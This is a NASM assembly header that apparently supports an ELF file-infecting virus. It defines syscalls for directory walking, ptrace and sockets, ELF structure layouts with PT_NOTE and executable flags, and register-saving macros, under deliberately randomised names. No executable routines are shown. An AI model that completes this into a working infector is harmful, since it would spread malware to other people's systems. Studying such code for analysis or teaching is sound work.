; SYSCALL
%define SYS_READ 0
%define SYS_WRITE 1
%define SYS_OPEN 2
%define SYS_CLOSE 3
%define SYS_LSEEK 8
%define SYS_MMAP 9
%define SYS_UNMAP 11
%define SYS_SOCKET 41
%define SYS_CONNECT 42
%define SYS_SENDTO 44
%define SYS_RECVFROM 45
%define SYS_EXIT 60
%define SYS_FTRUNCATE 77
%define SYS_PTRACE 101
%define SYS_GETPPID 110
%define SYS_GETDENTS 217

; SOCKET
%define AF_INET 2
%define SOCK_STREAM 1

; OPEN
%define O_RDONLY 0x0000
%define O_WRONLY 0x0001
%define O_RDWR 0x0002
%define O_DIRECTORY 0q0200000
%define O_CREAT 0x0040

; DIRENT
%define D_INO_OFF 0x00
%define D_FOLDER 0x4
%define D_OFF_OFF 0x08
%define D_REG_FILE 0x8
%define D_RECLEN_OFF 0x10
%define D_TYPE 0x12
%define D_NAME 0x13

; MMAP
%define PROT_EXEC 1
%define PROT_READ 2
%define PROT_WRITE 4
%define MAP_SHARED 1
%define MAP_PRIVATE 2
%define MAP_ANONYMOUS 0x20

; LSEEK
%define SEEK_SET 0x0
%define SEEK_END 0x2

; PTRACE
%define PTRACE_TRACEME 0x0
%define PTRACE_DETACH 0x17

%define CODE_LEN (z6wn5S1 - _start)
%define FINJMP_OFF (uizLK - _start)
%define PAGE_SIZE 0x1000

%define FAM(x) [(rbp - R8aeRf_size) + x]
%define SOCK(x) [(rbp - sock_size) + x]
%define INF(x) [(rbp - iTLlKa_size) + x]

%define CODE_LEN (z6wn5S1 - _start)
%define FINJMP_OFF (uizLK - _start)
%define PAGE_SIZE 0x1000

struc R8aeRf
.oWTyuV7W resb PAGE_SIZE
.tStT3L: resb PAGE_SIZE
.b13nWv9p resq 1
.hXH6TaLqq: resd 1
.DzMek0zbGu: resd 1
.IViVdSZB resq 1
endstruc

struc iTLlKa
.XK4N2V resq 1
.Gcjh36XuTv resq 1
.rClpKBG resq 1
.SucHT resb 1
.OXgAk0A4QP resq 1
.mJUVtH0nq resq 1
.uMYJbS75V resq 1
.hbJKoT resq 1
.xiP92d8M resq 1 
.MvEq6 resq 1
.Wpg8zw7 resq 1
.MsFE48OLM1 resb 1
.Xsglty resq 1
.p9QffSKvT resq 1
.m9vnK resq 1
endstruc

; ELF structures
%define PT_LOAD 0x1
%define PT_NOTE 0x4
%define PF_X 0x1
%define PF_R 0x4
%define SHT_PROGBITS 0x1
%define SHT_STRTAB 0x3
%define SHT_NOTE 0x7
%define SHT_RELA 0x4
%define SHF_ALLOC 0x2
%define SHF_EXECINSTR 0x4

struc RbMJnE
.C7lEtXxs: resb 16
.j433z: resw 1
.G8SHaC: resw 1
.nNEi7: resd 1
.AxDWcBPOXe: resq 1
.FdQ15: resq 1
.MgVzpMiBR: resq 1
.SH2Tj: resd 1
.YTJQ5pUbDw: resw 1
.LRIjIT1ThX: resw 1
.kiR7bYJWQb: resw 1
.WyC9P: resw 1
.VAs648: resw 1
.LvwedqRw: resw 1
endstruc

struc rOiwB
.PjK7i2ks: resd 1
.YehUdO: resd 1
.aKA4ydkCz: resq 1
.F79Terhn: resq 1
.yfVmOP: resq 1
.KsjhAbLrSN: resq 1
.EjNw5: resq 1
.li02GFUp: resq 1
endstruc

struc CjMWcH0fpC
.RakaG: resd 1
.c1HnvQe: resd 1
.K1XP2Ehay: resq 1
.vPZgvI2: resq 1
.zO68oeZBP: resq 1
.Q758DXc6DL: resq 1
.Slriie: resd 1
.mi89T: resd 1
.RXhEknU resq 1
.TKDLEtRD resq 1
endstruc

%macro PUSHA 0
push rax
push rbx
push rcx
push rdx
push rsi
push rdi
push r8
push r9
push r10
push r11
push r12
push r13
push r14
push r15
%endmacro

%macro POPA 0
pop r15
pop r14
pop r13
pop r12
pop r11
pop r10
pop r9
pop r8
pop rdi
pop rsi
pop rdx
pop rcx
pop rbx
pop rax
%endmacro 